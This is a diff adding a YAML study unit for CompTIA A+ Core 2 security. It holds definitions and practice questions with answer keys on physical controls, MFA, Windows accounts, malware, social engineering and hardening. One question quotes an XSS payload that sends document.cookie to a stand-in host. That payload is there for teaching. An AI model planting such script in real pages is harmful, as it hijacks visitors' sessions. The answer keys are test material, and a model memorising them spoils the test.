@@ -1,0 +1,1054 @@
+part_of: a-plus-core2
+
+units:
+  # ──────────── 2x · Domain 2 coverage, part one: controls, identity, Windows, malware ────────────
+  - id: ap2-2x
+    title: "Security coverage — controls, identity, Windows accounts and malware"
+    domain: "2"
+    goal: "I can name every physical and logical control, MFA method, Windows account type and Active Directory task on the blueprint, and recognise each listed kind of malware and the tool that deals with it."
+    notes: |
+      This unit fills in the Security topics that the first pass only touched. Treat it as a checklist: every term here appears in the official objectives.
+
+      ## Physical controls
+
+      **Bollards** stop vehicles; **fences** and **lighting** deter and delay; **motion sensors**, **alarms** and **video surveillance** detect; **guards** can judge and respond. **Badge readers** accept **key fobs**, **smart cards** or a **mobile digital key** on a phone. A **magnetometer** screens people for metal. **Cable locks** keep laptops on desks.
+
+      ## Identity
+
+      | Term | One-line meaning |
+      | IAM | Creating, changing and removing identities and their access |
+      | Directory service | The central database of users, groups and computers |
+      | SAML | Web SSO between an identity provider and a service |
+      | PAM + JIT | Admin rights only on approval, only for a while |
+      | MDM | Policy and remote control for phones and tablets |
+
+      MFA methods differ in strength: a **hardware security key** or **authenticator app** beats codes sent by **SMS**, **voice call** or **email**, which travel through channels an attacker can hijack.
+
+      ## Windows
+
+      Use a **standard** account day to day and **Run as administrator** only when needed. Keep the **guest** account disabled. A **Microsoft account** syncs settings; a local account does not. **Defender Antivirus** and **Defender Firewall** live in Windows Security; allow a *program* through the firewall in preference to opening a port range.
+
+      In Active Directory, **GPOs** linked to **OUs** apply settings, **logon scripts**, **home folders** and **folder redirection**; **security groups** carry permissions.
+
+      ## Malware
+
+      Know **virus, spyware, boot sector virus, cryptominer, stalkerware** and **PUPs**, and the tools: **EDR**, **MDR**, **XDR**, **email security gateways**, and scanning from **WinPE**.
+    items:
+      - id: ap2-2x-bollard
+        type: concept
+        term: "Bollards"
+        def: "Short, sturdy posts set into the ground in front of an entrance or glass frontage so that vehicles cannot be driven into the building, while people can still walk between them."
+      - id: ap2-2x-badge
+        type: concept
+        term: "Badge reader"
+        def: "The device fixed beside a door that checks an employee's identification card and releases the lock only if that card is authorised for that door at that time."
+      - id: ap2-2x-fob
+        type: concept
+        term: "Key fob"
+        def: "A small keyring token containing a short-range radio chip that unlocks a door when it is held near a reader."
+      - id: ap2-2x-mobilekey
+        type: concept
+        term: "Mobile digital key"
+        def: "An access credential stored on a smartphone and presented to a door or vehicle reader over NFC or Bluetooth in place of a plastic card or metal key."
+      - id: ap2-2x-magnet
+        type: concept
+        term: "Magnetometer"
+        def: "A walk-through or hand-held detector that senses metal objects carried by a person, used at entrances to screen for weapons or prohibited equipment."
+      - id: ap2-2x-cablelock
+        type: concept
+        term: "Cable lock"
+        def: "A steel cable that tethers a laptop or monitor to a desk through a reinforced slot in its case, deterring opportunistic theft."
+      - id: ap2-2x-acl
+        type: concept
+        term: "Access control list (ACL)"
+        def: "An ordered set of permit and deny entries attached to a resource or network interface, stating which users, addresses or traffic may reach it."
+      - id: ap2-2x-otp
+        type: concept
+        term: "One-time password (OTP)"
+        def: "A code that is accepted for one sign-in only, so a copy captured after use cannot be replayed."
+      - id: ap2-2x-hwtoken
+        type: concept
+        term: "Hardware token"
+        def: "A small dedicated physical device, such as a keyring code generator or a USB or NFC security key, whose presence the user proves during sign-in."
+      - id: ap2-2x-authapp
+        type: concept
+        term: "Authenticator application"
+        def: "A program on the user's phone that generates time-based sign-in codes or approves push requests, acting as the possession factor without relying on the phone number."
+      - id: ap2-2x-sms
+        type: concept
+        term: "SMS one-time code"
+        def: "A sign-in code delivered as a text message to the user's registered mobile number, a weak second factor because the number can be hijacked by SIM swapping."
+      - id: ap2-2x-saml
+        type: concept
+        term: "SAML"
+        def: "An XML-based standard in which an identity provider sends signed statements about an authenticated user to a separate web application, enabling web single sign-on across organisations."
+      - id: ap2-2x-pam
+        type: concept
+        term: "Privileged access management (PAM)"
+        def: "A system that vaults, controls, monitors and records the use of administrator and other high-power accounts, releasing their credentials only on approval."
+      - id: ap2-2x-jit
+        type: concept
+        term: "Just-in-time (JIT) access"
+        def: "Granting elevated rights only at the moment they are needed, for a fixed time window, and removing them automatically afterwards so that no account holds standing privilege."
+      - id: ap2-2x-mdm
+        type: concept
+        term: "Mobile device management (MDM)"
+        def: "A central console and on-device agent that enrol phones and tablets, push settings and apps, enforce passcode and encryption rules, and can lock or erase a device remotely."
+      - id: ap2-2x-iam
+        type: concept
+        term: "Identity and access management (IAM)"
+        def: "The overall discipline and tooling that creates, maintains and removes digital identities and decides what each one may reach across an organisation's systems."
+      - id: ap2-2x-dirsvc
+        type: concept
+        term: "Directory service"
+        def: "A central, searchable database of users, computers, groups and their attributes, queried over a protocol such as LDAP, that other systems consult to authenticate and look people up."
+      - id: ap2-2x-msacct
+        type: concept
+        term: "Microsoft account"
+        def: "A sign-in identity based on an email address and held in Microsoft's cloud, which carries settings, OneDrive files and Store purchases across every Windows device it signs in to."
+      - id: ap2-2x-guest
+        type: concept
+        term: "Guest account"
+        def: "A built-in Windows account for occasional visitors with very limited rights and no password, disabled by default and best left that way."
+      - id: ap2-2x-poweruser
+        type: concept
+        term: "Power Users group"
+        def: "A legacy local Windows group kept only for compatibility with old software; on current versions its members have no more rights than ordinary users by default."
+      - id: ap2-2x-passwordless
+        type: concept
+        term: "Passwordless authentication"
+        def: "Signing in without any reusable typed secret: the user proves possession of a private key held on a device or security key, unlocked locally by a PIN or biometric gesture."
+      - id: ap2-2x-attrib
+        type: concept
+        term: "File attributes"
+        def: "Flags such as read-only, hidden, system and archive stored with a file, which change how it is shown or handled but do not decide which users may open it."
+      - id: ap2-2x-secgroup
+        type: concept
+        term: "Security group"
+        def: "An Active Directory group that can be named in permissions, so rights granted to it apply to every member; unlike a distribution group it is not just a mailing list."
+      - id: ap2-2x-logonscript
+        type: concept
+        term: "Logon script"
+        def: "A batch or PowerShell file, set on a user's account or through Group Policy, that runs automatically every time the user signs in, typically to map drives and printers."
+      - id: ap2-2x-homefolder
+        type: concept
+        term: "Home folder"
+        def: "A personal folder on a file server, set in a user's Active Directory profile, that is mapped to a drive letter at sign-in to give that user private network storage."
+      - id: ap2-2x-redirect
+        type: concept
+        term: "Folder redirection"
+        def: "A Group Policy feature that moves the storage of known user folders such as Documents and Desktop to a network share, while they still appear in their usual place."
+      - id: ap2-2x-gpo
+        type: concept
+        term: "Group Policy Object (GPO)"
+        def: "A named collection of configuration and security settings that is linked to a site, domain or organizational unit and applied to the users and computers within it."
+      - id: ap2-2x-virus
+        type: concept
+        term: "Virus"
+        def: "Malicious code that attaches itself to a host file or program and spreads to other files when that host is run, needing a user action to travel."
+      - id: ap2-2x-spyware
+        type: concept
+        term: "Spyware"
+        def: "Software that secretly gathers information about a user's activity, such as browsing habits and personal data, and sends it to a third party."
+      - id: ap2-2x-bootsector
+        type: concept
+        term: "Boot sector virus"
+        def: "Malicious code written into the start-up area of a disk so that the firmware loads it before the operating system and its security software are running."
+      - id: ap2-2x-miner
+        type: concept
+        term: "Cryptominer"
+        def: "Malware that quietly uses a victim's processor or graphics card to generate digital currency for the attacker, causing heat, fan noise and slowness."
+      - id: ap2-2x-stalker
+        type: concept
+        term: "Stalkerware"
+        def: "Commercially sold monitoring software that someone with physical access secretly installs on another person's phone to follow their location, messages and calls."
+      - id: ap2-2x-pup
+        type: concept
+        term: "Potentially unwanted program (PUP)"
+        def: "Software bundled with a free download and accepted through a pre-ticked installer box, which adds toolbars, adverts or tracking the user did not really want."
+      - id: ap2-2x-edr
+        type: concept
+        term: "Endpoint detection and response (EDR)"
+        def: "Agent software on each computer that records process, file and network behaviour, flags suspicious patterns and lets responders isolate or clean the device."
+      - id: ap2-2x-mdr
+        type: concept
+        term: "Managed detection and response (MDR)"
+        def: "An outsourced service in which an external team of analysts watches an organisation's security alerts around the clock and investigates and responds on its behalf."
+      - id: ap2-2x-xdr
+        type: concept
+        term: "Extended detection and response (XDR)"
+        def: "A platform that correlates detection data from endpoints, network, email, cloud and identity sources into single incidents, rather than watching computers alone."
+      - id: ap2-2x-gateway
+        type: concept
+        term: "Email security gateway"
+        def: "A filtering service in the mail flow that inspects messages for spam, phishing links, forged senders and malicious attachments before they reach mailboxes."
+      - id: ap2-2x-winpe
+        type: concept
+        term: "Windows Preinstallation Environment (WinPE)"
+        def: "A minimal Windows started from USB, DVD or the network, used to install, repair or scan a computer while its own operating system, and any malware in it, is not running."
+
+      - id: ap2-2x-q01
+        type: mcq
+        q: "On an open-plan floor, laptops docked at hot desks keep disappearing during busy afternoons. Staff and visitors on the floor all passed the badge readers downstairs. Which control addresses this theft directly?"
+        choices:
+          - "Motion sensors on the ceiling"
+          - "A second badge reader at the floor entrance"
+          - "Cable locks fixing each laptop to its desk"
+          - "Bollards outside the main lobby"
+        answer: 2
+        why: "The thieves are people already allowed on the floor, so only something that holds the laptop in place helps. Another badge reader would admit the same people, and motion sensors are meant for detecting presence when nobody should be there."
+      - id: ap2-2x-q02
+        type: mcq
+        q: "A visitor centre must stop people carrying knives or other metal weapons into an auditorium, including visitors who hold a valid appointment badge. Which control is designed for this?"
+        choices:
+          - "An access control vestibule"
+          - "A badge reader"
+          - "Video surveillance"
+          - "A magnetometer"
+        answer: 3
+        why: "A magnetometer detects metal carried on the body. A vestibule and a badge reader decide who enters, not what they carry, so a badge holder with a knife would pass both."
+      - id: ap2-2x-q03
+        type: mcq
+        q: "A company wants staff to open doors by tapping their phones on the existing NFC readers, so that lost plastic cards no longer have to be reissued. What kind of credential is this?"
+        choices:
+          - "A mobile digital key"
+          - "A key fob"
+          - "A smart card"
+          - "A hardware token"
+        answer: 0
+        why: "A credential held on the phone and presented over NFC or Bluetooth is a mobile digital key. Key fobs and smart cards are the separate physical items the company is trying to move away from."
+      - id: ap2-2x-m01
+        type: multi
+        q: "Which TWO physical controls DETECT an intruder, rather than only deterring or delaying one? Choose TWO."
+        choices:
+          - "Motion sensors"
+          - "A perimeter fence"
+          - "Door-contact alarm system"
+          - "Bollards"
+          - "Exterior lighting"
+        answers: [0, 2]
+        why: "Motion sensors and door-contact alarms register that someone is present or a door has opened. Fences and bollards delay or block, and lighting deters and helps cameras, but none of them notices anyone by itself."
+      - id: ap2-2x-q04
+        type: mcq
+        q: "An attacker persuaded a mobile carrier to move a manager's number to a new SIM, then used the text-message sign-in codes to take over his mailbox. Which second factor should replace text codes so that this attack no longer works?"
+        choices:
+          - "Codes read out by an automated voice call"
+          - "A hardware security key"
+          - "Codes emailed to the mailbox being protected"
+          - "Text codes sent to a second mobile number"
+        answer: 1
+        why: "A hardware key must be physically present and is not tied to a phone number. Voice-call codes go to the same hijacked number, and emailing codes to the mailbox being protected is circular."
+      - id: ap2-2x-q05
+        type: mcq
+        q: "A school adopts a cloud learning platform. Staff should sign in through the school's identity provider with their existing credentials, and the platform should trust a signed statement from that provider instead of storing any passwords. Which standard is used?"
+        choices: ["Kerberos", "RADIUS", "SAML", "TACACS+"]
+        answer: 2
+        why: "SAML passes a signed assertion from an identity provider to a web service, which is exactly web single sign-on to a third party. Kerberos authenticates inside a Windows domain; it is not how a separate cloud web application trusts a school's sign-in."
+      - id: ap2-2x-q06
+        type: mcq
+        q: "An audit finds fourteen accounts permanently in Domain Admins, although administrative work is needed only a few hours a month. Admins must still be able to elevate quickly when a task is approved. Which approach fixes this?"
+        choices:
+          - "Move the accounts into the Power Users group"
+          - "Turn off User Account Control for the admins"
+          - "Force the admin passwords to change every month"
+          - "Just-in-time elevation through privileged access management"
+        answer: 3
+        why: "JIT access through PAM removes standing privilege and grants it only for an approved window. Rotating passwords leaves the fourteen accounts with permanent rights, and Power Users grants nothing useful on current Windows."
+      - id: ap2-2x-q07
+        type: mcq
+        q: "A user switched off Microsoft Defender Antivirus real-time protection in Windows Security to speed up a large copy. Later it is on again, and nobody touched it. What is the explanation?"
+        choices:
+          - "Turning it off there is temporary, and Windows turns it back on"
+          - "Malware switched it back on to hide its presence"
+          - "A firewall rule overrode the antivirus setting"
+          - "A definition update reinstalled the antivirus engine"
+        answer: 0
+        why: "Windows Security only lets a user switch real-time protection off for a short time; it re-enables itself automatically. Malware wants protection off, not on, so that explanation runs the wrong way."
+      - id: ap2-2x-q08
+        type: mcq
+        q: "A licensed design program receives files from colleagues on a port it picks at random each time it starts. It must work through Windows Defender Firewall without opening a wide port range. Which rule is BEST?"
+        choices:
+          - "An inbound port rule for TCP 1024-65535"
+          - "Turn off the firewall for the Private profile"
+          - "An inbound port rule for the port seen yesterday"
+          - "Allow the program's executable through the firewall"
+        answer: 3
+        why: "An application rule allows whatever port that one program opens and nothing else. A fixed port rule breaks at the next start, and a broad range or a disabled profile exposes every other listening service."
+      - id: ap2-2x-q09
+        type: mcq
+        q: "When a home PC first joined the Wi-Fi, the user answered No to letting it be discoverable. Now she cannot see her other PC's shared folder or her network printer, though web browsing works. What is the appropriate fix?"
+        choices:
+          - "Set the network profile to Private"
+          - "Disable Windows Defender Firewall"
+          - "Forward the printer's port on the router"
+          - "Sign in with a Microsoft account"
+        answer: 0
+        why: "Answering No made the network Public, which turns off network discovery and file and printer sharing; Private is right for a trusted home network. Disabling the firewall would also work but removes protection, which is never the proper fix."
+      - id: ap2-2x-q10
+        type: mcq
+        q: "A user who signs in with a local account wants her wallpaper, browser favourites and OneDrive files to follow her from her home PC to a new laptop. What should the technician set up?"
+        choices:
+          - "A second local account on the laptop"
+          - "A Microsoft account on both devices"
+          - "Both PCs in the same workgroup"
+          - "The Guest account on the new laptop"
+        answer: 1
+        why: "A Microsoft account syncs settings and OneDrive across every device it signs in to. A matching local account on each PC is a separate identity that shares nothing, and a workgroup only groups PCs on one network."
+      - id: ap2-2x-q11
+        type: mcq
+        q: "A standard user must run a vendor's diagnostic tool once, and the tool needs administrative rights. Policy forbids giving staff admin accounts. What should the technician do?"
+        choices:
+          - "Add the user to Administrators until tomorrow"
+          - "Turn off User Account Control"
+          - "Choose Run as administrator and enter admin credentials"
+          - "Add the user to the Power Users group"
+        answer: 2
+        why: "Run as administrator raises a UAC prompt where the technician types admin credentials, elevating that one program without changing the user's account. A temporary Administrators membership breaks the policy and is easily forgotten."
+      - id: ap2-2x-q12
+        type: mcq
+        q: "On a shared family PC, a user set the Hidden attribute on a folder of tax returns and believes the others can no longer open it. What should the technician tell her?"
+        choices:
+          - "Hidden folders are encrypted automatically with EFS"
+          - "Hidden folders can be opened only by administrators"
+          - "Hidden folders are removed from network shares"
+          - "Hidden only affects display; set NTFS permissions to restrict it"
+        answer: 3
+        why: "Attributes change how Explorer shows a folder, and anyone can tick 'Show hidden items'; access is controlled by NTFS permissions. Encryption is a separate, deliberate step."
+      - id: ap2-2x-q13
+        type: mcq
+        q: "Joining a PC to corp.example.local fails with 'An Active Directory domain controller for the domain could not be contacted'. The PC can ping the domain controller by IP address, and ipconfig shows its DNS server is 8.8.8.8. What is the fix?"
+        choices:
+          - "Set the PC's DNS server to the domain's DNS server"
+          - "Change the PC's subnet mask"
+          - "Run gpupdate /force"
+          - "Enable the local Guest account"
+        answer: 0
+        why: "Clients find domain controllers through DNS records that only the domain's DNS servers hold; a public resolver knows nothing of corp.example.local. The successful ping proves the addressing and mask are fine."
+      - id: ap2-2x-q14
+        type: mcq
+        q: "A technician moves a laptop's computer object from the Workstations OU to the Kiosks OU, which has a GPO that locks the desktop down. Five minutes later the laptop is still unrestricted. What should be done next?"
+        choices:
+          - "Remove the laptop from the domain and join it again"
+          - "Run gpupdate /force on the laptop, or restart it"
+          - "Add the laptop to a distribution group"
+          - "Copy the GPO into the Workstations OU"
+        answer: 1
+        why: "Moving the object changes which GPOs apply, but the laptop picks them up only at the next background refresh or restart; gpupdate /force fetches them now. Rejoining the domain is unnecessary, and copying the GPO would lock down every workstation."
+      - id: ap2-2x-q15
+        type: mcq
+        q: "Staff save to Documents and the Desktop out of habit and lose work whenever a PC is replaced. The manager wants those folders stored on the file server without users changing where they save. Which feature fits?"
+        choices:
+          - "A home folder"
+          - "A logon script"
+          - "BitLocker To Go"
+          - "Folder redirection"
+        answer: 3
+        why: "Folder redirection moves Documents and Desktop to a server share while they look unchanged to the user. A home folder gives a mapped drive, but users would have to remember to save to it."
+      - id: ap2-2x-q16
+        type: mcq
+        q: "After a breakup, a user finds her former partner knows where she has been and quotes her private texts. He had her unlocked phone for an evening last month. Which malware is MOST likely?"
+        choices:
+          - "Ransomware"
+          - "Stalkerware"
+          - "A cryptominer"
+          - "A boot sector virus"
+        answer: 1
+        why: "Location and message data reaching someone who once had physical access to the phone is the pattern of stalkerware. A cryptominer steals processing power, not personal data."
+      - id: ap2-2x-o01
+        type: order
+        q: "A technician has confirmed malware on a Windows 11 Home PC. Put the next steps in order."
+        steps:
+          - "Disconnect the PC from the network"
+          - "Disable System Restore"
+          - "Update the anti-malware definitions"
+          - "Scan and remove in Safe Mode or WinPE"
+          - "Schedule scans and run OS updates"
+          - "Enable System Restore and create a restore point"
+        why: "Quarantine comes first to stop spread, and System Restore is disabled before cleaning so infected restore points are discarded. Definitions are updated before the scan, and a fresh restore point is made only once the system is clean and patched."
+
+  # ──────────── 2y · Domain 2 coverage, part two: threats, hardening, disposal, SOHO, browsers ────────────
+  - id: ap2-2y
+    title: "Security coverage — threats, vulnerabilities, hardening and disposal"
+    domain: "2"
+    goal: "I can name each listed social-engineering attack, threat and vulnerability, and apply the hardening, disposal, router and browser settings that counter them."
+    notes: |
+      The second checklist unit covers the rest of the Security blueprint.
+
+      ## Social engineering
+
+      - **Phishing** is the mass email; **vishing** uses the phone, **smishing** text messages, and **QR code phishing** a printed or emailed code that the victim scans.
+      - In person: **shoulder surfing**, **tailgating**, **impersonation** and **dumpster diving**.
+
+      ## Threats
+
+      | Threat | Tell-tale |
+      | DoS / DDoS | One source / many sources flooding a service |
+      | Spoofing | A forged address, sender or caller ID |
+      | On-path | Traffic passes through the attacker |
+      | Brute force / dictionary | Every combination / a word list |
+      | SQL injection / XSS | Database commands / script in a web page |
+      | Insider threat | Legitimate access misused |
+      | BEC | Payment fraud by email, often no malware |
+      | Supply chain | A trusted vendor or update is the carrier |
+
+      Vulnerabilities on the list: **non-compliant**, **unpatched** and **unprotected** systems (no antivirus or firewall), **EOL** products and **BYOD** devices.
+
+      ## Hardening
+
+      Length matters more than complexity; use a **password manager**; set a **BIOS/UEFI password**; lock screens, log off, expire temporary accounts and restrict log-in hours.
+
+      ## Disposal, routers and browsers
+
+      A drive maker's zero-fill tool (often called **low-level formatting**) leaves a reusable drive; shredding and incineration do not. Check retention and environmental rules before disposing. On routers use **IP filtering**, **content filtering**, firmware updates and LAN-only management. In browsers, trust only store extensions, heed **certificate** warnings and keep the browser patched.
+    items:
+      - id: ap2-2y-phishing
+        type: concept
+        term: "Phishing"
+        def: "A fraudulent message sent to many people at once, usually by email, that imitates a trusted organisation to trick recipients into revealing credentials, paying, or opening malware."
+      - id: ap2-2y-vishing
+        type: concept
+        term: "Vishing"
+        def: "Social engineering carried out in a voice phone call, often with a forged caller ID, to talk the victim into revealing information or making a payment."
+      - id: ap2-2y-smishing
+        type: concept
+        term: "Smishing"
+        def: "Fraud sent as an SMS or similar text message that pushes the recipient to tap a link or reply with personal details."
+      - id: ap2-2y-quishing
+        type: concept
+        term: "QR code phishing"
+        def: "A lure that hides a malicious web address inside a scannable square barcode on a poster, sticker or email, so the victim opens it on a phone and mail filters never see a readable link."
+      - id: ap2-2y-shoulder
+        type: concept
+        term: "Shoulder surfing"
+        def: "Watching someone's screen or keypad, directly or through a camera, to capture a PIN, password or confidential information as it is entered."
+      - id: ap2-2y-tailgate
+        type: concept
+        term: "Tailgating"
+        def: "Following an authorised person through a secured door without presenting one's own credential."
+      - id: ap2-2y-impersonate
+        type: concept
+        term: "Impersonation"
+        def: "Pretending to be someone with authority or a legitimate reason, such as a help-desk technician, courier or auditor, to persuade staff to grant access or information."
+      - id: ap2-2y-dumpster
+        type: concept
+        term: "Dumpster diving"
+        def: "Searching through an organisation's discarded paper, media and equipment for information useful to an attack."
+      - id: ap2-2y-dos
+        type: concept
+        term: "Denial of service (DoS)"
+        def: "An attack from a single source that overwhelms a service or device so that legitimate users can no longer reach it."
+      - id: ap2-2y-ddos
+        type: concept
+        term: "Distributed denial of service (DDoS)"
+        def: "An attack in which many compromised machines, often a botnet, flood one target at the same time, so blocking a single source address does not stop it."
+      - id: ap2-2y-spoofing
+        type: concept
+        term: "Spoofing"
+        def: "Falsifying an identifier such as an IP address, MAC address, email sender or caller ID so that traffic or a message appears to come from someone else."
+      - id: ap2-2y-onpath
+        type: concept
+        term: "On-path attack"
+        def: "An attacker places themselves between two communicating parties, for example by ARP poisoning, so that they can read or alter the traffic passing between them."
+      - id: ap2-2y-brute
+        type: concept
+        term: "Brute-force attack"
+        def: "Trying every possible combination of characters until a password is found, which long passwords make impractical."
+      - id: ap2-2y-dict
+        type: concept
+        term: "Dictionary attack"
+        def: "Guessing passwords from a prepared list of common words, leaked passwords and their predictable variations instead of every combination."
+      - id: ap2-2y-insider
+        type: concept
+        term: "Insider threat"
+        def: "Risk posed by a current or former employee, contractor or partner who misuses legitimate access, deliberately or carelessly."
+      - id: ap2-2y-sqli
+        type: concept
+        term: "SQL injection"
+        def: "Entering crafted database commands into an application's input field so that the back-end database executes them."
+      - id: ap2-2y-xss
+        type: concept
+        term: "Cross-site scripting (XSS)"
+        def: "Planting script in a website, through a comment field or a crafted link, so that it runs in the browsers of other people who view the page."
+      - id: ap2-2y-bec
+        type: concept
+        term: "Business email compromise (BEC)"
+        def: "Fraud in which an attacker uses a hijacked or look-alike business mailbox to persuade staff to send payments or sensitive data, often with no malware or link involved."
+      - id: ap2-2y-supply
+        type: concept
+        term: "Supply chain attack"
+        def: "Compromising a trusted vendor, software update or build pipeline so that malicious code reaches many customers through a channel they already trust."
+      - id: ap2-2y-noncompliant
+        type: concept
+        term: "Non-compliant system"
+        def: "A device that fails the organisation's required configuration baseline, for example an unapproved OS version or missing mandatory settings, and so is a known weak point."
+      - id: ap2-2y-byod
+        type: concept
+        term: "Bring your own device (BYOD)"
+        def: "A policy that lets staff use personally owned phones, tablets or laptops for work, mixing company data with the owner's own apps and data."
+      - id: ap2-2y-pwmgr
+        type: concept
+        term: "Password manager"
+        def: "An encrypted vault, unlocked by one strong master credential, that generates, stores and fills in a different random password for every site."
+      - id: ap2-2y-fwpass
+        type: concept
+        term: "BIOS/UEFI password"
+        def: "A password held in the computer's firmware that must be entered to start the machine or to change its setup, stopping others from altering the boot order."
+      - id: ap2-2y-lowlevel
+        type: concept
+        term: "Low-level formatting"
+        def: "In everyday support use, running a drive maker's utility that writes zeros to every sector and removes all partitions, leaving the drive empty but reusable."
+      - id: ap2-2y-ipfilter
+        type: concept
+        term: "IP filtering"
+        def: "A router or firewall setting that allows or blocks traffic according to its source or destination IP address."
+      - id: ap2-2y-content
+        type: concept
+        term: "Content filtering"
+        def: "Blocking web content by category, keyword or address list, at a router, a DNS service or on the device, to stop users reaching unwanted or malicious sites."
+      - id: ap2-2y-profile
+        type: concept
+        term: "Configuration profile"
+        def: "A settings package installed on a phone or tablet, often by MDM, that sets up Wi-Fi, VPN, email, certificates and restrictions in one step."
+      - id: ap2-2y-locator
+        type: concept
+        term: "Locator application"
+        def: "A service that shows a lost phone or laptop's last known position on a map and can make it play a sound or lock it."
+
+      - id: ap2-2y-q01
+        type: mcq
+        q: "Stickers appear on a council car park's pay machines: 'Pay faster — scan here'. Drivers who scan are taken to a convincing payment page that takes their card details. Which attack is this?"
+        choices: ["Smishing", "Vishing", "QR code phishing", "Whaling"]
+        answer: 2
+        why: "The lure is a printed QR code scanned with a phone, which is QR code phishing. Smishing would arrive as a text message; here no message was sent at all."
+      - id: ap2-2y-q02
+        type: mcq
+        q: "An authentication log shows one account receiving these attempts in sequence: password1, Summer2025!, letmein, qwerty123, Welcome1. What kind of attack is this?"
+        choices:
+          - "Brute-force attack"
+          - "Dictionary attack"
+          - "Spoofing"
+          - "On-path attack"
+        answer: 1
+        why: "The guesses are common passwords taken from a list, which is a dictionary attack. A brute-force attack works through every combination, so its guesses look systematic, such as aaaa, aaab, aaac."
+      - id: ap2-2y-q03
+        type: mcq
+        q: "A small shop's web server is flooded. The technician blocks the source address in the firewall, but the flood continues from thousands of different addresses around the world. What is happening?"
+        choices:
+          - "A denial-of-service attack from one host"
+          - "An evil twin attack"
+          - "A brute-force attack"
+          - "A distributed denial-of-service attack"
+        answer: 3
+        why: "Traffic from thousands of addresses at once is a distributed attack, usually from a botnet, which is why blocking one address failed. A single-source DoS would have stopped once that address was blocked."
+      - id: ap2-2y-q04
+        type: mcq
+        q: "On a user's PC, arp -a shows the default gateway's IP address mapped to the same MAC address as a colleague's workstation. Web sessions have been slow and odd certificate warnings appear. Which attack is MOST likely?"
+        choices:
+          - "An on-path attack"
+          - "An evil twin attack"
+          - "A distributed denial of service"
+          - "SQL injection"
+        answer: 0
+        why: "ARP poisoning has made the user's PC send gateway traffic to the colleague's machine, which sits on the path and relays it. An evil twin is a fake wireless access point, and this PC is being misdirected on the existing LAN."
+      - id: ap2-2y-q05
+        type: mcq
+        q: "A forum's moderators find a post containing <script>fetch('https://bad.example/c?'+document.cookie)</script>. Members who viewed the thread report their sessions were hijacked. Which attack was used?"
+        choices:
+          - "SQL injection"
+          - "Cross-site scripting"
+          - "A dictionary attack"
+          - "Business email compromise"
+        answer: 1
+        why: "Script stored in a page ran in other visitors' browsers and sent their session cookies away, which is cross-site scripting. SQL injection targets the site's database, not the visitors' browsers."
+      - id: ap2-2y-q06
+        type: mcq
+        q: "In the week before leaving for a competitor, a salesperson copies the entire customer database to a personal USB drive, using his own valid account. What kind of threat is this?"
+        choices:
+          - "A supply chain attack"
+          - "An on-path attack"
+          - "An insider threat"
+          - "Impersonation"
+        answer: 2
+        why: "A legitimate user misusing his own access is an insider threat. Impersonation means pretending to be someone else, and he used his own identity."
+      - id: ap2-2y-q07
+        type: mcq
+        q: "Several firms find a backdoor on their servers. All of them had installed a correctly signed update from the same management-software vendor, whose build system had been breached. What kind of attack is this?"
+        choices:
+          - "A zero-day attack on each firm's servers"
+          - "Spoofing of the vendor's update server"
+          - "An insider threat at each firm"
+          - "A supply chain attack"
+        answer: 3
+        why: "The malware arrived through a trusted vendor's genuine, signed update after its build pipeline was compromised, which is a supply chain attack. Spoofing would need a fake server, and here the update came from the real one with a valid signature."
+      - id: ap2-2y-q08
+        type: mcq
+        q: "A man in a hi-vis vest with a toolbox tells reception he is from the copier company and must check the server room's 'network module' urgently. He has no work order. Which technique is he using?"
+        choices:
+          - "Impersonation"
+          - "Shoulder surfing"
+          - "Dumpster diving"
+          - "Whaling"
+        answer: 0
+        why: "He is posing as a trusted contractor to talk his way in, which is impersonation. He is not yet following anyone through a door, and shoulder surfing would mean watching someone enter information."
+      - id: ap2-2y-q09
+        type: mcq
+        q: "To make a game run faster, a user uninstalled the antivirus and turned off Windows Defender Firewall on a fully patched, supported PC. Which listed vulnerability does this PC now represent?"
+        choices:
+          - "An end-of-life system"
+          - "An unprotected system"
+          - "A zero-day vulnerability"
+          - "A BYOD device"
+        answer: 1
+        why: "Missing antivirus and firewall is exactly what the objectives call an unprotected system. The PC is still supported and patched, so it is neither end-of-life nor unpatched."
+      - id: ap2-2y-q10
+        type: mcq
+        q: "Which password policy gives the MOST resistance to a brute-force attack?"
+        choices:
+          - "8 characters using upper case, lower case, digits and symbols"
+          - "10 characters using lower case and digits"
+          - "16 characters using lower case and digits"
+          - "8 characters, changed every 30 days"
+        answer: 2
+        why: "Sixteen characters from 36 symbols allow about 8 x 10^24 combinations, far more than eight characters from roughly 94 symbols (about 6 x 10^15); length grows the search space fastest. Frequent changes do nothing to slow a guessing attack in progress."
+      - id: ap2-2y-q11
+        type: mcq
+        q: "Someone booted a reception PC from a USB stick and reset the local administrator password. The drive is not encrypted. Which setting would have stopped this method?"
+        choices:
+          - "A longer screen-lock timeout"
+          - "A password expiration policy"
+          - "Disabling the guest account"
+          - "A BIOS/UEFI password with USB boot disabled"
+        answer: 3
+        why: "Locking the firmware setup and removing USB from the boot order stops the PC starting another operating system. Windows password policies never run when Windows is not the system being started."
+      - id: ap2-2y-q12
+        type: mcq
+        q: "A small office's router administration page can be reached from the internet on its public address. Nobody manages it from outside the office. What should be changed?"
+        choices:
+          - "Disable remote (WAN-side) management"
+          - "Disable SSID broadcast"
+          - "Enable UPnP"
+          - "Add a port forward to the router's own address"
+        answer: 0
+        why: "Management that is needed only inside the office should be reachable only from the LAN. Hiding the SSID affects the wireless network name, not who can reach the admin page from the internet."
+      - id: ap2-2y-q13
+        type: mcq
+        q: "A user installed a 'free coupon finder' browser extension from a link on a deals website, not from the browser's store. Since then shopping pages show extra adverts and links go to unfamiliar sites. What should the technician do FIRST?"
+        choices:
+          - "Clear the browser cache"
+          - "Remove the extension and review the others installed"
+          - "Turn on private-browsing mode"
+          - "Turn off the pop-up blocker"
+        answer: 1
+        why: "The extension from an untrusted source is injecting the adverts and redirects; removing it removes the cause. Clearing the cache only deletes stored copies of pages, and the extension would keep running."
+
+  # ───────────────────── 2z2 · Security, exam-hard practice ─────────────────────
+  - id: ap2-2z2
+    title: "Security — exam-hard practice"
+    domain: "2"
+    goal: "I can read a short support scenario, work out which security problem or request it describes, and choose the response that fits its constraint."
+    notes: |
+      These scenarios are harder than the exam. Each one gives a **symptom or a request** and a **constraint** (cost, time, who owns the device, what must keep working). Two choices usually fit the symptom; the constraint decides.
+
+      ## Habits that win marks
+
+      - **Name the thing first.** Before reading the choices, say what is happening: a cryptominer, a BYOD phone, a Kerberos clock fault. Then pick the response.
+      - **Order matters.** The malware procedure has ten steps; Group Policy applies Local, Site, Domain, then OU; a router is secured from default password outwards.
